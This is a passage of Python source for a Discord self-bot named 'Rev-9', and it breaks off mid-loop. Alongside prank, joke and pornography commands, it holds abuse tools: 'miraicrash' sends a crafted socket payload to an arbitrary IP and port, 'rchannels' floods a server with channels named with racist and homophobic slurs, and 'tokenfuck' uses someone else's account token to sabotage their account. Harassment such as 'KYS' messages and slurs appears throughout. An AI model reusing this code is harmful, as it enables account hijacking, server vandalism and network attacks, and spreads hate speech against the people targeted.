      '.YAIdcA.TkflOnwtmNCyE0m1IzJkJ7adR2A'
    ]
    randomanswer = random.choice(responses)
    await ctx.send(f"```{encoded_stuff}{randomanswer}```")
    print(f"{Fore.RED}[GRABBED TOKEN]: {Fore.YELLOW}{encoded_stuff}{randomanswer}"+Fore.RESET)

@Rev9.command()
async def bored (ctx): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'Learn new coding language',
      'Go fuck yourself LOL',
      'Take a nap',
      'Fuck your mom',
      'Have sex with Marci',
      'Cry in the corner',
      'Shoot yoursefl lol jk',
      'Boost rev9 discord server',
      'Give ur ip to marci',
      'Play something'
    ]
    randomanswer = random.choice(responses)
    em = discord.Embed(title=f"{Rev9.user} Something to do", description=f"{randomanswer}", colour=0x0000)
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def userid (ctx, member:discord.User=None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot print your own user ID")
        return
    string = member.id
    await asyncio.sleep(0.5)
    await ctx.send(f"Getting users ID...")
    await asyncio.sleep(1)
    await ctx.send(f"```{string}```")
    print(f"{Fore.RED}[USER ID]: {Fore.YELLOW}{string}"+Fore.RESET)

@Rev9.command()
async def tti(ctx, *, txt): # b'\xfc'
    await ctx.message.delete()
    api = f"http://api.img4me.com/?font=arial&fcolor=cc990c&size=24&type=png&text={txt}".format(urllib.parse.quote_plus(txt))	 
    html = urlopen(api).read()
    embed=discord.Embed(description="", colour=0x0000)
    embed.set_footer(text=promote)
    soup = bs4(html, features="html.parser")
    text = soup.get_text()
    embed.set_image(url=soup)
    await ctx.send(embed=embed, delete_after=deltime)
    print(f"{Fore.BLUE}[INFO]: {Fore.RED}This command shows a error, but theres nothing to worry about. {Fore.YELLOW}Use {prefix}cls to clear the console...")

@Rev9.command()
async def number(ctx): # b'\xfc'
  await ctx.message.delete()
  number = random.randint(0, 1000)
  embed = discord.Embed(title='Number Generator', description=f"`{number}`", colour=0x0000)
  embed.set_footer(text=promote)
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def emojitext(ctx, *, txt): # b'\xfc'
    await ctx.message.delete()
    tosend = ''
    l = len(txt)
    for i in range(0, l):
        ch = txt[i].lower()
        if ch >= '0' and ch <= '9':
            if ch == '0':
                tosend += ':zero: '
            if ch == '1':
                tosend += ':one: '
            if ch == '2':
                tosend += ':two: '
            if ch == '3':
                tosend += ':three: '
            if ch == '4':
                tosend += ':four: '
            if ch == '5':
                tosend += ':five: '
            if ch == '6':
                tosend += ':six: '
            if ch == '7':
                tosend += ':seven: '
            if ch == '8':
                tosend += ':zero: '
            if ch == '9':
                tosend += ':zero: '  
        else:
            if ch >= 'a' and ch <= 'z':
                tosend += ':regional_indicator_' + ch + ': '
            elif ch == ' ':
                tosend += '     '

            else:
                tosend += txt[i]

    if len(tosend) > 2000:
        print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Your text exceeded the 2000 character limit.")
    else:
        await ctx.send(tosend)  

@Rev9.command()
async def hideyt(ctx, link): # b'\xfc'
  await ctx.message.delete()
  secret = link
  embed = discord.Embed(description=f"**[Rev-9 vs Grace Highway Chase Extended Scene]({secret})**", colour=0x0000)
  embed.set_author(name="Rev-9 Terminator", url="https://www.youtube.com/channel/UCUpEa7mw4ak6TkQ-tEg8eKQ")
  embed.set_image(url="https://media.discordapp.net/attachments/805420081941184532/805421318358958100/unknown.png?width=324&height=183")
  embed.set_footer(text="Rev-9")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def hidenitro(ctx, secret): # b'\xfc'
  await ctx.message.delete()
  embed = discord.Embed()
  gay = secret
  embed.set_author(name="Nitro Gift", url=f"{gay}", icon_url="https://vignette.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest/top-crop/width/220/height/220?cb=20200615092656")
  embed.add_field(name="Redeem:", value=f"[https://discord.gift/gwE3q7rTXKtE34Hs]({gay})")
  embed.set_footer(text="Rev-9")
  embed.set_thumbnail(url="https://vignette.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest/top-crop/width/220/height/220?cb=20200615092656")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def kys(ctx, *, user:discord.User=None): # b'\xfc'
  await ctx.message.delete()
  if user is None:
    user = ctx.author
  ass = user
  all_image_choices = ["https://cdn.discordapp.com/attachments/804276663592419348/805425909733654537/2F76EA1D9275166D3D2248130D482B10D2D4D80C.png", "https://cdn.discordapp.com/attachments/805420081941184532/805426934758637608/0DC22B23A5C7D326E64F68A3663630CB1F74FFAC.png", "https://tenor.com/view/m-katze-no-kill-yourself-gif-12476739", "https://media.discordapp.net/attachments/805420081941184532/805427423997984788/feZdnjwh.png?width=558&height=480", "https://tenor.com/view/pokemon-kys-mlg-deal-with-it-gif-18499704"]
  chosen_image = random.choice(all_image_choices )
  embed = discord.Embed(title=f'KYS {ass}')
  embed.set_image(url=chosen_image)
  embed.set_footer(text=promote)
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def embed(ctx, title, *, url):
  await ctx.message.delete()
  embed=discord.Embed(title=title)
  embed.set_image(url=f'{url}')
  embed.set_footer(text=promote)
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def revqr(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="SCAN ME")
  embed.set_image(url='https://cdn.discordapp.com/attachments/792116121938952222/806331129565020170/My_Gallery.png')
  embed.set_footer(text=promote)
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def ask(ctx, *, ques): # b'\xfc'
  await ctx.message.delete()
  text = ques
  answers = ["Yes.", "No.", "Maybe."]
  ans = random.choice(answers)
  embed=discord.Embed(title="Question asked:", description=f"```\n{text}\n```", colour=0x0000)
  embed.add_field(name="Answer:", value=f"{ans}")
  embed.set_footer(text=promote)
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def invite(ctx): # b'\xfc'
  await ctx.message.delete()
  all_image_choices = ["https://cdn.discordapp.com/attachments/805420081941184532/805430428961341460/tenor.gif", "https://cdn.discordapp.com/attachments/804276663592419348/805434549151989810/ezgif-6-45fc7bc40fba.gif", "", "https://cdn.discordapp.com/attachments/804276663592419348/805437831770144829/1440697541_222.gif"]
  chosen_image = random.choice(all_image_choices )
  embed=discord.Embed(title="Rev-9{Self-Bot}®", description="[Click here to join!](https://discord.gg/cquMTEmm)")
  embed.set_image(url=chosen_image)
  embed.set_footer(text=promote)
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def ricknitro(ctx): # b'\xfc'
  await ctx.message.delete()
  embed = discord.Embed()
  embed.set_author(name="Nitro Gift", url="https://www.youtube.com/watch?v=xvFZjo5PgG0", icon_url="https://vignette.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest/top-crop/width/220/height/220?cb=20200615092656")
  embed.add_field(name="Redeem:", value="[https://discord.gift/gwE3q7rTXKtE34Hs](https://www.youtube.com/watch?v=dQw4w9WgXcQ)")
  embed.set_footer(text=promote)
  embed.set_thumbnail(url="https://vignette.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest/top-crop/width/220/height/220?cb=20200615092656")
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def findrblx(ctx, *, user:discord.User=None): # b'\xfc'
  await ctx.message.delete()
  if user is None:
    user = ctx.author
  rbx = f"https://verify.eryn.io/api/user/{user.id}"
  output = requests.get(rbx).text
  embed = discord.Embed(title="Roblox Username:", description=f"```\n{output}\n```")
  embed.set_footer(text=promote)
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
  await ctx.send(embed=embed, delete_after=deltime)


@Rev9.command()
async def hack (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot hack yourself!")
        return
    if reason == None:
        reason = "being a jerk! lolol"
    message = f"{member} has been hacked for {reason}"
    await ctx.channel.send(message)
    await ctx.channel.send(f"```Encrypting {member}'s Password and Email...```")
    await asyncio.sleep(1)
    await ctx.channel.send(f"```Loading encrypted data...```")
    await asyncio.sleep(1)
    await ctx.channel.send(f"```{member}'s hacking is complete!```")
    await asyncio.sleep(1)
    await ctx.channel.send(f"```Pass: Imsexy123 E-mail: nigas3x@gmail.com```")
    await asyncio.sleep(1)
    await ctx.channel.send(f"```Uploading data to crackedcordusers.com ...```")
    await asyncio.sleep(1)
    await ctx.channel.send(f"```The totally real and dangerous hack is complete!```")

@Rev9.command()
async def vpnconnect (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("New IP address is 89.47.234.196 / Canada")
        return
    if reason == None:
        reason = "new IP address is 89.47.234.196"
    message = f"{member} new IP address is {reason}"
    await ctx.channel.send(message)

@Rev9.command()
async def backupbot(ctx): # b'\xfc'
    await ctx.message.delete()
    call(["python", "backupbot.py"])

@Rev9.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            em.set_footer(text=promote)
            await ctx.send(embed=em, delete_after=deltime)


#@Rev9.command(aliases=['pfp', 'avatar'])
#async def av(ctx, *, user:discord.User=None): # b'\xfc'
#     await ctx.message.delete()
#     if user is None:
#         user = ctx.author
#     format = "gif"
#     if user.is_avatar_animated() != True:
#         format = "png"
#     avatar = user.avatar_url_as(format = format if format != "gif" else None)
#     async with aiohttp.ClientSession() as session:
#         async with session.get(str(avatar)) as resp:
#             image = await resp.read()
#     with io.BytesIO(image) as file:
#        await ctx.send(file = discord.File(file, f"Avatar.{format}"))

@Rev9.command(aliases=['pfp', 'avatar'])
async def av(ctx, user:discord.User=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    em = discord.Embed(description=user.mention)
    em.set_image(url=user.avatar_url)
    em.set_footer(text=promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    em = discord.Embed(colour=0x0000)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name='Creation Date', value=created_on)
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def ping(ctx): # b'\xfc'
    await ctx.message.delete()
    emb = (discord.Embed(title="Rev-9 Ping",description=f"**{round(Rev9.latency *1000)}ms.**"))
    emb.set_footer(text=promote)
    emb.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=emb, delete_after=deltime) 

@Rev9.command()
async def whois(ctx, user:discord.User=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.guild, discord.Guild):
        roles = [role for role in user.roles]
        embed = discord.Embed(colour=0x0000, timestamp=ctx.message.created_at,
                            title=f"User Info - {user}")
        embed.set_thumbnail(url=user.avatar_url)
        embed.set_footer(text=promote)

        embed.add_field(name="ID:", value=user.id)
        embed.add_field(name="Display Name:", value=user.display_name)

        embed.add_field(name="Created Account On:", value=user.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
        embed.add_field(name="Joined Server On:", value=user.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

        embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
        embed.add_field(name="Highest Role:", value=user.top_role.mention)
        print(user.top_role.mention)
        await ctx.send(embed=embed, delete_after=deltime)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def xban(ctx, user_id: int, reason): # b'\xfc'
    await ctx.message.delete()
    try:
        await ctx.bot.http.ban(user_id, ctx.message.guild.id, 0, reason=reason)
    except discord.Forbidden:
        await ctx.channel.send(":x: 403 FORBIDDEN")
    except discord.NotFound:
        await ctx.channel.send(":x: User not found.")
    else:
        await ctx.channel.send(":negative_squared_cross_mark:  Banned user '{}'.".format(user_id), delete_after=deltime)
        print("Banned user {}.".format(user_id))

@Rev9.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=anal')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Anal', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=hentai')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Hentai', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def hentaianal(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=hanal')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Hentai Anal', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def hentaiboobs(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=hboobs')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Hentai Boobs', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)
    
@Rev9.command()
async def hentaitentacle(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=tentacle')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Hentai Tentacle', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command() 
async def porngif(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/image?type=pgif')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Porn Gif', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def meme(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://meme-api.herokuapp.com/gimme')
    data = request.json()
    link = data['url']
    title = data['title']
    embed= discord.Embed(color=0x0000, title=title, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def uselessfact(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://uselessfacts.jsph.pl/random.json?language=en')
    data = request.json()
    fact = data['text']
    embed= discord.Embed(color=0x0000, title='Useless Fact', description=f'> {fact}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Light_Bulb_or_Idea_Flat_Icon_Vector.svg/473px-Light_Bulb_or_Idea_Flat_Icon_Vector.svg.png')
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def dadjoke(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://icanhazdadjoke.com/', headers={'accept': 'application/json'})
    data = request.json()
    joke = data['joke']
    embed= discord.Embed(color=0x0000, title='Dad Joke', description=f'{joke}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url='https://images-eu.ssl-images-amazon.com/images/I/61f0lTa6KkL.png')
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def joke(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'http://www.official-joke-api.appspot.com/random_joke')
    data = request.json()
    setup = data['setup']
    punchline = data['punchline']
    embed= discord.Embed(color=0x0000, title='Joke', description=f'{setup} ||{punchline}||', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/810624835990454334/816797544919203870/61f0lTa6KkL-removebg-preview.png')
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def trumptweet(ctx, *, tweet: str=None): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={tweet}')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=0x0000, title=f'Trump Tweet', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def pcspecs(ctx): # b'\xfc'
    await ctx.message.delete()
    computer = wmi.WMI()
    os_info = computer.Win32_OperatingSystem()[0]
    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    embed = discord.Embed(color=0x0000, title='My PC Specifications', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name=f'Platform', value=str(os_name).replace("'", "").replace("b", "", 1), inline=True)
    embed.add_field(name=f'RAM', value=f'{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB', inline=True)
    embed.add_field(name=f'Graphics Card', value=f'{computer.Win32_VideoController()[0].Name}', inline=True)
    embed.add_field(name=f'CPU', value=f'{computer.Win32_Processor()[0].Name}', inline=True)
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/810624835990454334/816803732548747264/wp6988270-removebg-preview.png')
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def minesweeper(ctx, size: int = 5): # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Rev9.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    emb.set_footer(text=promote)
    emb.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=emb, delete_after=deltime)    
    
@Rev9.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@Rev9.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@Rev9.command()
async def miraicrash(ctx, ip: str, port: int): # b'\xfc'
    if ip or port is not None:
        await ctx.message.delete()
        embed= discord.Embed(colour=0x0000, title=f'Mirai Crash', description=f'Crashed Mirai at {ip}:{port}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)
        payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(*xc2xa3&(*&$^*(^xc2xa3*&)((*&)(*&()))))" * 25
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(payload.encode())
        s.close()
    else:
        print('033[1;31;40mMissing arguments')
        return

@Rev9.command()
async def blank(ctx): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:  
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:      
             await Rev9.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Rev9.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Rev9.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Rev9.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Rev9.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Rev9.command(usage='add <number> <number>', description='adds two numbers together')
async def add(ctx, num1 : float, num2 : float):
    
    await ctx.message.delete()
    await ctx.send("**Answer**: %f" %  (num1 + num2))

@Rev9.command(usage='mult <number> <number>', description='multiplys two numbers together')
async def mult(ctx, num1 : float, num2 : float):
    
    await ctx.message.delete()
    await ctx.send("**Answer**: %f" %  (num2 * num1))
@Rev9.command(usage='div <number> <number>', description='divides two numbers')
async def div(ctx, num1 : float, num2 : float):
    
    await ctx.message.delete()
    if(not(num2 ==  0)):
     await ctx.send("**Answer**: %f" %  (num1 / num2))
    else:
     await ctx.send("num2 cannot be 0" %  num2)
@Rev9.command(usage='sub <number> <number>', description='subbtracts two numbers together')
async def sub(ctx, num1 : float, num2 : float):
    
    await ctx.message.delete()
    await ctx.send("**Answer**: %f" %  (num1 - num2))

@Rev9.command(usage=f'genpfp')
async def genpfp(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/avatar")
    res = r.json()
    em = discord.Embed(color=random.randint(0, 0xffffff))
    em.set_image(url=res['url'])
    em.set_footer(text=promote)
    await ctx.send(embed=em)

@Rev9.listen()
async def on_messages(message): # b'\xfc'
    if message.guild is not None:
        if message.guild.id == 754640505991856138:
            content = message.content
            if 'Marci' in content.lower():
                try:
                    await asyncio.sleep(1)
                    await message.add_reaction("👍")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Added reaction")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Server: {message.guild}")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Channel: {message.channel}")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Author: {message.author}")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Message: {content}\n")
                except Exception as e:
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Could not react: {e}")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Server: {message.guild}")
                    print(
                        f"{Fore.MAGENTA} [Reaction] {Style.RESET_ALL} | Channel: {message.channel}\n")

@Rev9.command()
async def rchannels(ctx, amount=500):
            await ctx.message.delete()
            guild = ctx.message.guild 
            for i in range(amount):
                await guild.create_text_channel(random.choice(CHANNEL_NAMES))

CHANNEL_NAMES = ["fucked by rev9", "rev9 was here LOL", "kys nigger", "suck my dick","fucking apes","xddddd","DIE","fuck niggers","kys nigga","sped","L","lol get nuked faggot","nuked","mic up pussy"]

@Rev9.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    em.set_footer(text=promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command(aliases=['marcidicksize', 'marcisdick'])
async def marcisdicksize(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(30, 50)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v8/hypesquad/online', headers=headers, json=payload, timeout=10)
        em = discord.Embed(title="Rev-9 hypesquad changer", description=f"Changed hypesquad to {house}", colour=0x0000)
        em.add_field(name="API Version:", value="V8", inline=False)
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Rev9.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): # b'\xfc' 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': "rev9",
        'icon': "",
        'name': "rev9",
        'region': "europe"
    } 
    for _i in range(50):
